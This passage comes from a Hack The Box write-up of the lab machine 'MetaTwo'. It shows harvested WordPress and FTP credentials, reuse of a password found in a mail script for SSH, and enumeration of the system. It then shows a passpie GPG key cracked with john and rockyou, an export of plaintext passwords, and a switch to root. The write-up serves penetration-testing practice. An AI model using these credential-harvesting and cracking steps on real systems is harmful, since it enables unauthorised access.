+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_PASS&#39;</span><span class=p>,</span> <span class=s1>&#39;9NYS_ii@FyL_p5M2NvJ&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_HOST&#39;</span><span class=p>,</span> <span class=s1>&#39;ftp.metapress.htb&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_BASE&#39;</span><span class=p>,</span> <span class=s1>&#39;blog/&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;FTP_SSL&#39;</span><span class=p>,</span> <span class=k>false</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;AUTH_KEY&#39;</span><span class=p>,</span>         <span class=s1>&#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;SECURE_AUTH_KEY&#39;</span><span class=p>,</span>  <span class=s1>&#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;LOGGED_IN_KEY&#39;</span><span class=p>,</span>    <span class=s1>&#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;NONCE_KEY&#39;</span><span class=p>,</span>        <span class=s1>&#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;AUTH_SALT&#39;</span><span class=p>,</span>        <span class=s1>&#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;SECURE_AUTH_SALT&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;LOGGED_IN_SALT&#39;</span><span class=p>,</span>   <span class=s1>&#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>define</span><span class=p>(</span> <span class=s1>&#39;NONCE_SALT&#39;</span><span class=p>,</span>       <span class=s1>&#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39;</span> <span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=ftp-1>FTP</h2><ol><li>We can use <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code> to login</li><li>There is an interesting file. <code>send_email.php</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Host</span> <span class=o>=</span> <span class=s2>&#34;mail.metapress.htb&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>SMTPAuth</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>                          
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Username</span> <span class=o>=</span> <span class=s2>&#34;jnelson@metapress.htb&#34;</span><span class=p>;</span>                 
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Password</span> <span class=o>=</span> <span class=s2>&#34;Cb4_JmWM8zUZWMu@Ys&#34;</span><span class=p>;</span>                           
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>SMTPSecure</span> <span class=o>=</span> <span class=s2>&#34;tls&#34;</span><span class=p>;</span>                           
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>Port</span> <span class=o>=</span> <span class=mi>587</span><span class=p>;</span>                                   
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>From</span> <span class=o>=</span> <span class=s2>&#34;jnelson@metapress.htb&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>FromName</span> <span class=o>=</span> <span class=s2>&#34;James Nelson&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$mail</span><span class=o>-&gt;</span><span class=na>addAddress</span><span class=p>(</span><span class=s2>&#34;info@metapress.htb&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><ul><li>We can use this address to SSH into the machine.</li></ul><h2 id=shell-as-jnelson>Shell as jnelson</h2><ol><li>Sudo privileges</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> sudo -l
+</span></span><span class=line><span class=cl>Sorry, user jnelson may not run sudo on meta2.
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>Group info</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>groups
+</span></span><span class=line><span class=cl>jnelson
+</span></span></code></pre></td></tr></table></div></div><ol start=3><li>ID</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl>uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
+</span></span></code></pre></td></tr></table></div></div><ol start=4><li>Nothing interesting with <code>/etc/group</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>systemd-network:x:102:
+</span></span><span class=line><span class=cl>systemd-resolve:x:103:
+</span></span><span class=line><span class=cl>input:x:104:
+</span></span><span class=line><span class=cl>kvm:x:105:
+</span></span><span class=line><span class=cl>render:x:106:
+</span></span><span class=line><span class=cl>crontab:x:107:
+</span></span><span class=line><span class=cl>netdev:x:108:
+</span></span><span class=line><span class=cl>messagebus:x:109:
+</span></span><span class=line><span class=cl>ssh:x:110:
+</span></span><span class=line><span class=cl>jnelson:x:1000:
+</span></span><span class=line><span class=cl>systemd-timesync:x:999:
+</span></span><span class=line><span class=cl>systemd-coredump:x:998:
+</span></span><span class=line><span class=cl>mysql:x:111:
+</span></span></code></pre></td></tr></table></div></div><ol start=5><li>Environment enumeration</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>env
+</span></span><span class=line><span class=cl>SHELL=/bin/bash
+</span></span><span class=line><span class=cl>PWD=/home/jnelson
+</span></span><span class=line><span class=cl>LOGNAME=jnelson
+</span></span><span class=line><span class=cl>XDG_SESSION_TYPE=tty
+</span></span><span class=line><span class=cl>MOTD_SHOWN=pam
+</span></span><span class=line><span class=cl>HOME=/home/jnelson
+</span></span><span class=line><span class=cl>LANG=en_US.UTF-8
+</span></span><span class=line><span class=cl>LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+</span></span><span class=line><span class=cl>SSH_CONNECTION=10.10.16.35 49808 10.129.255.232 22
+</span></span><span class=line><span class=cl>XDG_SESSION_CLASS=user
+</span></span><span class=line><span class=cl>TERM=tmux-256color
+</span></span><span class=line><span class=cl>USER=jnelson
+</span></span><span class=line><span class=cl>SHLVL=1
+</span></span><span class=line><span class=cl>XDG_SESSION_ID=124
+</span></span><span class=line><span class=cl>XDG_RUNTIME_DIR=/run/user/1000
+</span></span><span class=line><span class=cl>SSH_CLIENT=10.10.16.35 49808 22
+</span></span><span class=line><span class=cl>PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</span></span><span class=line><span class=cl>SSH_TTY=/dev/pts/0
+</span></span><span class=line><span class=cl>_=/usr/bin/env
+</span></span></code></pre></td></tr></table></div></div><ol start=6><li>OS Info</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat /etc/os-release
+</span></span><span class=line><span class=cl>PRETTY_NAME=&#34;Debian GNU/Linux 11 (bullseye)&#34;
+</span></span><span class=line><span class=cl>NAME=&#34;Debian GNU/Linux&#34;
+</span></span><span class=line><span class=cl>VERSION_ID=&#34;11&#34;
+</span></span><span class=line><span class=cl>VERSION=&#34;11 (bullseye)&#34;
+</span></span><span class=line><span class=cl>VERSION_CODENAME=bullseye
+</span></span><span class=line><span class=cl>ID=debian
+</span></span><span class=line><span class=cl>HOME_URL=&#34;https://www.debian.org/&#34;
+</span></span><span class=line><span class=cl>SUPPORT_URL=&#34;https://www.debian.org/support&#34;
+</span></span><span class=line><span class=cl>BUG_REPORT_URL=&#34;https://bugs.debian.org/&#34;
+</span></span></code></pre></td></tr></table></div></div><ol start=7><li>Open ports</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ss -tlnp
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port          Process          
+</span></span><span class=line><span class=cl>LISTEN          0               80                           127.0.0.1:3306                        0.0.0.0:*                              
+</span></span><span class=line><span class=cl>LISTEN          0               511                            0.0.0.0:80                          0.0.0.0:*                              
+</span></span><span class=line><span class=cl>LISTEN          0               128                            0.0.0.0:22                          0.0.0.0:*                              
+</span></span><span class=line><span class=cl>LISTEN          0               511                               [::]:80                             [::]:*                              
+</span></span><span class=line><span class=cl>LISTEN          0               128                                  *:21                                *:*                              
+</span></span><span class=line><span class=cl>LISTEN          0               128                               [::]:22                             [::]:*  
+</span></span></code></pre></td></tr></table></div></div><ul><li>We can try to access the local database</li></ul><ol start=8><li>There is a file called <code>~/.passpie/ssh/root.pass</code></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat root.pass
+</span></span><span class=line><span class=cl>comment: &#39;&#39;
+</span></span><span class=line><span class=cl>fullname: root@ssh
+</span></span><span class=line><span class=cl>login: root
+</span></span><span class=line><span class=cl>modified: 2022-06-26 08:58:15.621572
+</span></span><span class=line><span class=cl>name: ssh
+</span></span><span class=line><span class=cl>password: &#39;-----BEGIN PGP MESSAGE-----
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  lpF0RatbxQGWBks5F3o=
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  =uh1B
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  -----END PGP MESSAGE-----
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  &#39;
+</span></span></code></pre></td></tr></table></div></div><ol start=9><li>Let me try to crack the hash</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gpg2john tmp &gt; hash
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) &lt;passpie@local&gt;::tmp
+</span></span></code></pre></td></tr></table></div></div><p>To crack it with john the ripper,</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>john hash --wordlist=/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>blink182         (Passpie)
+</span></span></code></pre></td></tr></table></div></div><ol start=10><li>We can export the passwords to plaintext. (Because the clipboard option did not work for me, maybe because I am using SSH?)</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>passpie</span> <span class=k>export</span> <span class=n>passwords</span><span class=o>.</span><span class=n>db</span>
+</span></span><span class=line><span class=cl><span class=n>Passphrase</span><span class=p>:</span> 
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cat passwords.db 
+</span></span><span class=line><span class=cl>credentials:
+</span></span><span class=line><span class=cl>- comment: &#39;&#39;
+</span></span><span class=line><span class=cl>  fullname: root@ssh
+</span></span><span class=line><span class=cl>  login: root
+</span></span><span class=line><span class=cl>  modified: 2022-06-26 08:58:15.621572
+</span></span><span class=line><span class=cl>  name: ssh
+</span></span><span class=line><span class=cl>  password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;
+</span></span><span class=line><span class=cl>- comment: &#39;&#39;
+</span></span><span class=line><span class=cl>  fullname: jnelson@ssh
+</span></span><span class=line><span class=cl>  login: jnelson
+</span></span><span class=line><span class=cl>  modified: 2022-06-26 08:58:15.514422
+</span></span><span class=line><span class=cl>  name: ssh
+</span></span><span class=line><span class=cl>  password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;
+</span></span><span class=line><span class=cl>handler: passpie
+</span></span><span class=line><span class=cl>version: 1.0
+</span></span></code></pre></td></tr></table></div></div><ol start=11><li>We can now change usernames to root</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>su
+</span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@meta2:/home/jnelson# id
+</span></span><span class=line><span class=cl>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/htb/>HTB</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/htb-remote-writeup/><div class=article-image><img src=/p/htb-remote-writeup/1.b5688338ca3ce4b1e41ee9ab55ac6419_hu_89d711bc665e1e75.png width=250 height=150 loading=lazy alt="Featured image of post HTB Remote Writeup" data-hash="md5-tWiDOMo85LHkHumrVaxkGQ=="></div><div class=article-details><h2 class=article-title>HTB Remote Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-access-writeup/><div class=article-image><img src=/p/htb-access-writeup/1.4f3ed6721d0b1f0d7cb5c076f91c8b33_hu_7103002c3cf8d65.png width=250 height=150 loading=lazy alt="Featured image of post HTB Access Writeup" data-hash="md5-Tz7Wch0LHw18tcB2+RyLMw=="></div><div class=article-details><h2 class=article-title>HTB Access Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-forest-writeup/><div class=article-image><img src=/p/htb-forest-writeup/7dedecb452597150647e73c2dd6c24c7.51700c627e21c04b108d17649b571bee_hu_965f781c9ce4eccf.png width=250 height=150 loading=lazy alt="Featured image of post HTB Forest Writeup" data-hash="md5-UXAMYn4hwEsQjRdkm1cb7g=="></div><div class=article-details><h2 class=article-title>HTB Forest Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-delivery-writeup/><div class=article-image><img src=/p/htb-delivery-writeup/c55af6eadd5b60bac831d73c1a951327.03a81260a84541d40dc13396b054e2b6_hu_c4f878e7fe38a287.png width=250 height=150 loading=lazy alt="Featured image of post HTB Delivery Writeup" data-hash="md5-A6gSYKhFQdQNwTOWsFTitg=="></div><div class=article-details><h2 class=article-title>HTB Delivery Writeup</h2></div></a></article><article class=has-image><a href=/p/htb-administrator-writeup/><div class=article-image><img src=/p/htb-administrator-writeup/9d232b1558b7543c7cb85f2774687363.51683f38be59c5f378320400d5a07b8f_hu_65bd3124748aa3f4.png width=250 height=150 loading=lazy alt="Featured image of post HTB Administrator Writeup" data-hash="md5-UWg/OL5ZxfN4MgQA1aB7jw=="></div><div class=article-details><h2 class=article-title>HTB Administrator Writeup</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
